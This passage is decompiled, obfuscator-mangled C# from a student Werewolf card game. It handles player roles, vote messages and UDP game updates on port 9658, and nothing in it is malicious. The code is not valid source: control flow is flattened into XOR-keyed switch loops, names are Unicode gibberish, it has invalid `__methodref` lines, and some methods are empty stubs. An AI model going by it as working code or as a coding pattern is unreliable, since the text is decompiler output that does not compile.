                num1 = -13;
                continue;
              }
              goto label_23;
            case 6:
              if (flag)
              {
                num1 = -20;
                continue;
              }
              num3 = 1;
              break;
            case 7:
              Expression = Encoding.ASCII.GetString(bytes);
              num1 = -11;
              continue;
            case 8:
              num3 = 0;
              break;
            default:
              goto label_2;
          }
          if (num3 == 0)
            this.PlayerList[index].SetPlayerCardType(strArray[0]);
label_18:
          int num4 = (int) sbyte.MaxValue;
          while (true)
          {
            switch (num4 ^ 63)
            {
              case 63:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.get_Card11);
                num4 = 0;
                continue;
              case 64:
                this.thisPlayer = this.PlayerList[0];
                num4 = 126;
                continue;
              case 65:
                this.InitialRole = this.thisPlayer.GetCardType;
                num4 = 125;
                continue;
              case 66:
                goto label_22;
              default:
                goto label_18;
            }
          }
label_22:
          checked { ++index; }
label_23:
          if (index <= num2)
            goto label_6;
          else
            break;
        }
        int num5 = 0;
        do
        {
          if ((!strArray[1].Equals(checked (num5 + 1).ToString()) ? 1 : 0) == 0)
            this.MiddleCardsList.Add(strArray[0]);
          checked { ++num5; }
        }
        while (num5 <= 2);
        int num6 = checked (this.MiddleCardsList.Count - 1);
        int index1 = 0;
        if (index1 == 0)
          goto label_32;
label_29:
        if ((!this.MiddleCardsList[index1].Contains("WereWolf") ? 1 : 0) == 0)
          this.OneWereWolf = true;
        checked { ++index1; }
label_32:
        if (index1 > num6)
          this.Invoke((Delegate) new MainForm.\uF44A\uE487\uF52F\uEE05\uF8CB\uECF2\uEDD5\uEC3A\uF4A4\uEA56\uF418\uE3B5(this.GameSetUp), (object) this.thisPlayer.GetCardType);
        else
          goto label_29;
      }
    }

    public void GameSetUp(string type)
    {
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF499()
    {
label_4:
      int num1 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(27);
      int num2 = 7;
      while (true)
      {
        switch (num2 ^ 58)
        {
          case 58:
            goto label_4;
          case 59:
            int index;
            int num3;
            bool flag;
            int num4;
            switch (num1 + 56)
            {
              case 0:
                if (index == 0)
                {
                  num1 = -16;
                  goto label_1;
                }
                else
                  goto label_22;
              case 1:
                index = 1;
                num1 = -13;
                goto label_1;
              case 2:
                num3 = checked (this.PlayerList.Count - 1);
                num1 = -14;
                goto label_1;
              case 3:
label_12:
                flag = this.PlayerList[index] != null;
                num1 = -10;
                goto label_1;
              case 4:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.get_RestartRoundButton);
                num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(8);
                goto label_1;
              case 5:
                if (flag)
                {
                  num1 = -11;
                  goto label_1;
                }
                else
                {
                  num4 = 1;
                  break;
                }
              case 6:
                num4 = 0;
                break;
              default:
                num2 = 0;
                continue;
            }
            if (num4 == 0)
              this.ListOfPlayerNameLabels[index].Text = this.PlayerList[index].GetPlayerName;
            checked { ++index; }
label_22:
            if (index <= num3)
              goto label_12;
            else
              goto label_20;
          case 60:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.get_BindingSource1);
            num2 = 6;
            continue;
          case 61:
label_1:
            num1 ^= 59;
            break;
        }
        num2 = 1;
      }
label_20:;
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF49A()
    {
      IPEndPoint remoteEP = new IPEndPoint(IPAddress.Any, 9658);
label_42:
      string type1;
      string str1;
      string str2;
      string type2;
      while (true)
      {
        string str3;
        do
        {
          byte[] bytes = this.receivingUpdateCardChanges.Receive(ref remoteEP);
label_2:
          int num1 = 4;
          bool flag;
          string[] strArray;
          string Expression;
          while (true)
          {
            switch (num1 ^ 58)
            {
              case 54:
                if (flag)
                {
                  num1 = 122;
                  continue;
                }
                goto label_15;
              case 55:
                type1 = strArray[2];
                num1 = 2;
                continue;
              case 56:
                str1 = strArray[3];
                num1 = 1;
                continue;
              case 57:
                strArray = Strings.Split(Expression, "<>");
                num1 = 7;
                continue;
              case 58:
                flag = str3.Equals("PlayerSwap");
                num1 = 12;
                continue;
              case 59:
                str3 = strArray[4];
                num1 = 0;
                continue;
              case 60:
                str2 = strArray[1];
                num1 = 13;
                continue;
              case 61:
                type2 = strArray[0];
                num1 = 6;
                continue;
              case 62:
                Expression = Encoding.ASCII.GetString(bytes);
                num1 = 3;
                continue;
              case 63:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (MainForm.set_PlayerName9);
                num1 = 5;
                continue;
              case 64:
                goto label_14;
              default:
                goto label_2;
            }
          }
label_14:
          int num2 = 0;
          goto label_16;
label_15:
          num2 = 1;
label_16:
          if (num2 == 0)
            goto label_17;
        }
        while ((!str3.Equals("MiddleSwap") ? 1 : 0) != 0);
        int num = checked (this.PlayerList.Count - 1);
        int index = 0;
        if (index == 0)
          goto label_40;
label_37:
        if ((!this.PlayerList[index].GetUniquePlayerID.Equals(str1) ? 1 : 0) == 0)
          this.PlayerList[index].SetPlayerCardType(type1);
        checked { ++index; }
label_40:
        if (index > num)
          this.MiddleCardsList[Conversions.ToInteger(str2)] = type2;
        else
          goto label_37;
      }
label_17:
      int num3 = checked (this.PlayerList.Count - 1);
label_19:
      int num4 = 14;
      while (true)
      {
        bool flag;
        int index;
        int num5;
        switch (num4 ^ 54)
        {
          case 54:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MainForm._Lambda\u0024__R223\u002D5);
            num4 = 0;
            continue;
          case 55:
            if (flag)
            {
              num4 = 13;
              continue;
            }
            num5 = 1;
            break;
          case 56:
            index = 0;
            num4 = 15;
            continue;
          case 57:
            if (index != 0)
            {
              num4 = 12;
              continue;
            }
            goto label_34;
          case 58:
label_26:
            flag = this.PlayerList[index].GetUniquePlayerID.Equals(str1);
            num4 = 1;
            continue;
          case 59:
            num5 = 0;
            break;
          default:
            goto label_19;
        }
        if (num5 == 0)
          this.PlayerList[index].SetPlayerCardType(type1);
        if ((!this.PlayerList[index].GetUniquePlayerID.Equals(str2) ? 1 : 0) == 0)
          this.PlayerList[index].SetPlayerCardType(type2);
        checked { ++index; }
label_34:
        if (index <= num3)
          goto label_26;
        else
          goto label_42;
      }
    }

    public void RevealAllCards()
    {
label_2:
      int num1 = 120;
      while (true)
      {
        int num2;
        int num3;
        switch (num1 ^ 59)
        {
          case 62:
label_3:
            this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF49B(num2);
            num1 = 122;
            continue;
          case 63:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MainForm.get_SendButton);
            num1 = 4;
            continue;
          case 64:
            num2 = 0;
            num1 = 121;
            continue;
          case 65:
            num1 = (int) sbyte.MaxValue;
            continue;
          case 66:
            if (num2 != 0)
            {
              num1 = 5;
              continue;
            }
            break;
          case 67:
            num3 = checked (this.PlayerList.Count - 1);
            num1 = 123;
            continue;
          case 68:
            checked { ++num2; }
            break;
          default:
            goto label_2;
        }
        if (num2 <= num3)
          goto label_3;
        else
          break;
      }
      int num4 = checked (this.MiddleCardsList.Count - 1);
label_14:
      int num5 = 1;
      while (true)
      {
        int num6;
        switch (num5 ^ 60)
        {
          case 60:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MainForm.get_Card6);
            num5 = 0;
            continue;
          case 61:
            num6 = 0;
            num5 = 3;
            continue;
          case 62:
label_17:
            this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF49C(num6);
            num5 = 124;
            continue;
          case 63:
            if (num6 != 0)
            {
              num5 = 2;
              continue;
            }
            break;
          case 64:
            num5 = 125;
            continue;
          case 65:
            checked { ++num6; }
            break;
          default:
            goto label_14;
        }
        if (num6 <= num4)
          goto label_17;
        else
          break;
      }
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF49B(
      int _param1)
    {
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF49C(
      int _param1)
    {
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF49D(
      object _param1,
      FormClosingEventArgs _param2)
    {
      this.Disconnect();
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF49E(
      object _param1,
      EventArgs _param2)
    {
      int num = (int) Interaction.MsgBox((object) "As a fan of One Night Ultimate Werewolf this game was chosen to be recreated for the PC as a school project for a Visual Basic course.\r\n\r\nCoded By George Erfesoglou\r\n\r\nAll card art and background soundtrack property of Bezier Games, Inc.\r\nOrignal Game concept and idea by Bezier Games.", Title: ((object) "About"));
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF49F(
      object _param1,
      EventArgs _param2)
    {
      int num = (int) Interaction.MsgBox((object) "Once at least 3 people have joined and have checked that they are ready, each player is randomly assigned a role that is revealed to them until the 5 second mark.\r\nOnce the cards are shown and even while hidden you can click your card to reveal details about that cards ability and time to play.\r\n\r\nThe game is Humans vs Werewolfs, the Humans are trying to find and hunt the Werewolfs and the Werewolfs are trying to not get hunted\r\n\r\nOnce everyone has preformed their action the inital game setup is over (Night) and the disccusion begins (Day).\r\n\r\nThe timer resets and everyone is givin 5 minutes to figure out who is who and vote to kill whomever they beileve the Werewolf to be or convince the others otherwise.\r\n\r\nCurrently the voting can be done in chat by typing out the name of the person you want to kill before the 5 minute mark.\r\n\r\nOnce time is up all the cards are revealed and the player who recieved the most votes dies. In the case of ties all who tied die.\r\nSo long as one Werewolf gets shot the Humans win regardless if a human had to die in the process. However, if no Werewolf dies the Humans lose.", MsgBoxStyle.Information, (object) "Insturctions On How To Play");
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF4A0(
      object _param1,
      EventArgs _param2)
    {
      if ((!this.RoundStarted ? 1 : 0) != 0)
        return;
      this.VMF = new VoteMenuForm(this.PlayerList, this.AlreadyVoted);
label_7:
      int num1 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(30);
      int num2 = 125;
      while (true)
      {
        switch (num2 ^ 60)
        {
          case 62:
            switch (num1 + 61)
            {
              case 0:
                this.VMF.Show();
                num1 = -4;
                goto label_2;
              case 1:
                num1 = -3;
                goto label_2;
              case 2:
                this.VoteMenuButton.Enabled = false;
                num1 = -1;
                goto label_2;
              case 3:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF4A0);
                num1 = -2;
                goto label_2;
              case 4:
                num1 = -16;
                goto label_2;
              case 5:
                goto label_15;
              default:
                num2 = 3;
                continue;
            }
          case 63:
            goto label_7;
          case 64:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF47B);
            num2 = 124;
            continue;
          case 65:
label_2:
            num1 ^= 56;
            break;
        }
        num2 = 2;
      }
label_15:;
    }

    public void EnableVoteMenuButton()
    {
label_7:
      int num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(8);
      int num2 = -11;
      while (true)
      {
        switch ((num2 ^ 57) + 55)
        {
          case 0:
            switch (num1 + 54)
            {
              case 0:
                this.VoteMenuButton.Enabled = true;
                num1 = -15;
                goto label_1;
              case 1:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.set_PlayerName2);
                num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(13);
                goto label_1;
              case 2:
                num1 = -16;
                goto label_1;
              case 3:
                goto label_9;
              default:
                num2 = -14;
                continue;
            }
          case 1:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.get_TimerLabel);
            num2 = -13;
            continue;
          case 2:
            goto label_7;
          case 3:
label_1:
            num1 ^= 61;
            break;
        }
        num2 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(31);
      }
label_9:;
    }

    public void SendVoteToEveryone(Player playreVotedFor)
    {
label_4:
      int num1 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(31);
      int num2 = -16;
      while (true)
      {
        switch ((num2 ^ 61) + 54)
        {
          case 0:
            goto label_4;
          case 1:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.get_ReadyToStart);
            num2 = -10;
            continue;
          case 2:
            byte[] bytes;
            switch (num1 + 54)
            {
              case 0:
                this.sendingClientPlayerInfo.Send(bytes, bytes.Length);
                num1 = -15;
                goto label_1;
              case 1:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.get_CardInfoButton);
                num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(8);
                goto label_1;
              case 2:
                bytes = Encoding.ASCII.GetBytes(playreVotedFor.GetPlayerName + "<>" + playreVotedFor.GetCardType + "<>-<>" + playreVotedFor.GetUniquePlayerID.ToString() + "<>" + this.InitialRole + "<>UpdateKillVotes");
                num1 = -10;
                goto label_1;
              case 3:
                this.AlreadyVoted = true;
                num1 = -14;
                goto label_1;
              case 4:
                goto label_11;
              default:
                num2 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(8);
                continue;
            }
          case 3:
label_1:
            num1 ^= 60;
            break;
        }
        num2 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(27);
      }
label_11:;
    }

    public void SendVotesToEndRound()
    {
label_7:
      int num1 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(31);
      int num2 = 8;
      while (true)
      {
        switch (num2 ^ 55)
        {
          case 60:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm._Lambda\u0024__R223\u002D6);
            num2 = 11;
            continue;
          case 61:
            byte[] bytes;
            switch (num1 + 59)
            {
              case 0:
                this.AlreadyVoted = true;
                num1 = -2;
                goto label_1;
              case 1:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF4A1);
                num1 = -15;
                goto label_1;
              case 2:
                bytes = Encoding.ASCII.GetBytes(this.thisPlayer.GetPlayerName + "<>" + this.thisPlayer.GetCardType + "<>-<>" + this.thisPlayer.GetUniquePlayerID.ToString() + "<>-<>UpdateVotesToEndRound");
                num1 = -1;
                goto label_1;
              case 3:
                this.sendingClientPlayerInfo.Send(bytes, bytes.Length);
                num1 = -14;
                goto label_1;
              case 4:
                goto label_11;
              default:
                num2 = 9;
                continue;
            }
          case 62:
            goto label_7;
          case 63:
label_1:
            num1 ^= 55;
            break;
        }
        num2 = 10;
      }
label_11:;
    }

    public void VoteToEndRound()
    {
label_4:
      int num1 = 11;
      int num2 = 116;
      while (true)
      {
        switch (num2 ^ 54)
        {
          case 63:
            goto label_4;
          case 64:
            bool flag;
            switch (num1)
            {
              case 58:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF470);
                num1 = 12;
                goto label_1;
              case 59:
                flag = this.voteCount == this.PlayerList.Count;
                num1 = 10;
                goto label_1;
              case 60:
                if (flag)
                {
                  num1 = 8;
                  goto label_1;
                }
                else
                  goto label_14;
              case 61:
                checked { ++this.voteCount; }
                num1 = 13;
                goto label_1;
              case 62:
                goto label_13;
              default:
                num2 = 9;
                continue;
            }
          case 65:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.get_GameTime);
            num2 = 119;
            continue;
          case 66:
label_1:
            num1 ^= 54;
            break;
        }
        num2 = 118;
      }
label_13:
      int num3 = 0;
      goto label_15;
label_14:
      num3 = 1;
label_15:
      if (num3 != 0)
        return;
      this.EndRoundVotePassed = (object) true;
    }

    public void Disconnect()
    {
label_5:
      int num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(7);
      int num2 = 122;
      while (true)
      {
        switch (num2 ^ 56)
        {
          case 63:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm._Lambda\u0024__R223\u002D3);
            num2 = 7;
            continue;
          case 64:
            goto label_5;
          case 65:
            byte[] bytes;
            switch (num1 + 62)
            {
              case 0:
                bytes = Encoding.ASCII.GetBytes(this.thisPlayer.GetPlayerName + "<>" + this.thisPlayer.GetCardType + "<>-<>" + this.thisPlayer.GetUniquePlayerID.ToString() + "<>-<>Disconnected");
                num1 = -7;
                goto label_1;
              case 1:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46B);
                num1 = -2;
                goto label_1;
              case 2:
                this.sendingClientPlayerInfo.Send(bytes, bytes.Length);
                num1 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(5);
                goto label_1;
              case 3:
                goto label_10;
              default:
                num2 = 120;
                continue;
            }
          case 66:
label_1:
            num1 ^= 61;
            break;
        }
        num2 = 121;
      }
label_10:;
    }

    public void RestartRound()
    {
label_2:
      int num1 = (int) sbyte.MaxValue;
label_1:
      while (true)
      {
        num1 ^= 62;
        switch (num1)
        {
          case 56:
            this.CharacterList.Add("TroubleMaker");
            num1 = 117;
            continue;
          case 57:
            this.StartRound = true;
            num1 = 123;
            continue;
          case 58:
            this.TimeMulti = 0;
            this.SawCard = false;
            num1 = 115;
            continue;
          case 59:
            this.RolePlayTime.Clear();
            num1 = 1;
            continue;
          case 60:
            this.CharacterList.Add("WereWolf");
            num1 = 118;
            continue;
          case 61:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MainForm.set_PlayerName1);
            num1 = 3;
            continue;
          case 62:
            goto label_9;
          case 63:
            this.Time = 0;
            this.Night = (object) true;
            num1 = 4;
            continue;
          case 64:
            this.GameTime.Enabled = false;
            num1 = 0;
            continue;
          case 65:
            this.isReadyList.Clear();
            num1 = 126;
            continue;
          case 66:
            this.CharacterList.Add("WereWolf");
            num1 = 2;
            continue;
          case 67:
            this.TurnAllowed = false;
            this.TMFirstPickIndex = (object) -1;
            num1 = 119;
            continue;
          case 68:
            this.CharacterList.Add("Robber");
            num1 = 6;
            continue;
          case 69:
            this.voteCount = 0;
            this.EndRoundVotePassed = (object) false;
            num1 = 5;
            continue;
          case 70:
            this.TimerLabel.Text = "Timer";
            num1 = 112;
            continue;
          case 71:
            this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF48B();
            num1 = 113;
            continue;
          case 72:
            this.CharacterList.Add("Seer");
            num1 = 122;
            continue;
          case 73:
            this.RobbersNewRole = "Robber";
            this.CharacterList.Clear();
            num1 = 124;
            continue;
          case 74:
            this.ReadyToStart.Checked = false;
            num1 = 120;
            continue;
          case 75:
            this.ReadyToStart.Enabled = true;
            num1 = 116;
            continue;
          case 76:
            \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uEB7F\uF247\uE858\uF5C7\uEC2A\uECFA\uEDD9\uE261\uF6B8\uF56C\uEBA5\uF443.Audio.Stop();
            num1 = 121;
            continue;
          case 77:
            this.OneWereWolf = false;
            this.CardCount = 0;
            num1 = 125;
            continue;
          case 78:
            this.TurnLabel.Text = "";
            num1 = 114;
            continue;
          case 79:
            goto label_30;
          default:
            goto label_2;
        }
      }
label_9:
      this.RoundStarted = false;
label_11:
      int num2 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(32);
      while (true)
      {
        switch ((num2 ^ 54) + 59)
        {
          case 0:
            this.VoteMenuButton.Enabled = false;
            num2 = -15;
            continue;
          case 1:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.UpdateSettings);
            num2 = -16;
            continue;
          case 2:
            num1 = 7;
            num2 = -2;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_11;
        }
      }
label_30:;
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF4A1(
      object _param1,
      EventArgs _param2)
    {
      if ((!this.isMaster ? 1 : 0) != 0)
        return;
label_4:
      int num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(13);
      int num2 = -13;
      while (true)
      {
        switch ((num2 ^ 56) + 56)
        {
          case 0:
            goto label_4;
          case 1:
            byte[] bytes;
            switch (num1 + 56)
            {
              case 0:
                this.sendingClientPlayerInfo.Send(bytes, bytes.Length);
                num1 = -12;
                goto label_1;
              case 1:
                bytes = Encoding.ASCII.GetBytes(this.thisPlayer.GetPlayerName + "<>" + this.thisPlayer.GetCardType + "<>-<>" + this.randomIntegerID.ToString() + "<>" + this.isMaster.ToString() + "<>RestartRound");
                num1 = -9;
                goto label_1;
              case 2:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.set_PlayerName3);
                num1 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(25);
                goto label_1;
              case 3:
                goto label_12;
              default:
                num2 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(31);
                continue;
            }
          case 2:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF483);
            num2 = -14;
            continue;
          case 3:
label_1:
            num1 ^= 63;
            break;
        }
        num2 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(27);
      }
label_12:;
    }

    public void UpdateCharacterList(string RoleToAdd)
    {
label_6:
      int num1 = 10;
      int num2 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(32);
      while (true)
      {
        switch ((num2 ^ 54) + 62)
        {
          case 0:
            byte[] bytes;
            switch (num1)
            {
              case 55:
                bytes = Encoding.ASCII.GetBytes(this.thisPlayer.GetPlayerName + "<>" + this.thisPlayer.GetCardType + "<>-<>" + this.randomIntegerID.ToString() + "<>" + this.isMaster.ToString() + "<>UpdateCharacterList<>" + RoleToAdd);
                num1 = 5;
                goto label_1;
              case 56:
                this.sendingClientPlayerInfo.Send(bytes, bytes.Length);
                num1 = 7;
                goto label_1;
              case 57:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm._Lambda\u0024__R223\u002D6);
                num1 = 4;
                goto label_1;
              case 58:
                goto label_10;
              default:
                num2 = -11;
                continue;
            }
          case 1:
            goto label_6;
          case 2:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.get_Card3);
            num2 = -14;
            continue;
          case 3:
label_1:
            num1 ^= 61;
            break;
        }
        num2 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(40);
      }
label_10:;
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF4A2(
      object _param1,
      EventArgs _param2)
    {
label_5:
      int num1 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(27);
      int num2 = 120;
      while (true)
      {
        switch (num2 ^ 58)
        {
          case 63:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm._Lambda\u0024__R223\u002D3);
            num2 = 5;
            continue;
          case 64:
            goto label_5;
          case 65:
            CardInfoForm cardInfoForm;
            switch (num1 + 55)
            {
              case 0:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF487);
                num1 = -14;
                goto label_1;
              case 1:
                cardInfoForm = new CardInfoForm();
                num1 = -9;
                goto label_1;
              case 2:
                num1 = -10;
                goto label_1;
              case 3:
                cardInfoForm.Show();
                num1 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(31);
                goto label_1;
              case 4:
                goto label_9;
              default:
                num2 = 122;
                continue;
            }
          case 66:
label_1:
            num1 ^= 59;
            break;
        }
        num2 = 123;
      }
label_9:;
    }

    private delegate void \uF44A\uE487\uF52F\uEE05\uF8CB\uECF2\uEDD5\uEC3A\uF4A4\uEA56\uF418\uE3B1(
      RichTextBox _param1,
      string _param2);

    private delegate void \uF44A\uE487\uF52F\uEE05\uF8CB\uECF2\uEDD5\uEC3A\uF4A4\uEA56\uF418\uE3B2(
      CheckBox _param1,
      string _param2);

    private delegate void \uF44A\uE487\uF52F\uEE05\uF8CB\uECF2\uEDD5\uEC3A\uF4A4\uEA56\uF418\uE3B3(
      bool _param1);

    private delegate void \uF44A\uE487\uF52F\uEE05\uF8CB\uECF2\uEDD5\uEC3A\uF4A4\uEA56\uF418\uE3B4(
      string _param1);

    private delegate void \uF44A\uE487\uF52F\uEE05\uF8CB\uECF2\uEDD5\uEC3A\uF4A4\uEA56\uF418\uE3B5(
      string _param1);

    private delegate void \uF44A\uE487\uF52F\uEE05\uF8CB\uECF2\uEDD5\uEC3A\uF4A4\uEA56\uF418\uE3B6();

    private delegate void \uF44A\uE487\uF52F\uEE05\uF8CB\uECF2\uEDD5\uEC3A\uF4A4\uEA56\uF418\uE3B7();

    private delegate void \uF44A\uE487\uF52F\uEE05\uF8CB\uECF2\uEDD5\uEC3A\uF4A4\uEA56\uF418\uE3B8();

    private delegate void \uF44A\uE487\uF52F\uEE05\uF8CB\uECF2\uEDD5\uEC3A\uF4A4\uEA56\uF418\uE3B9();

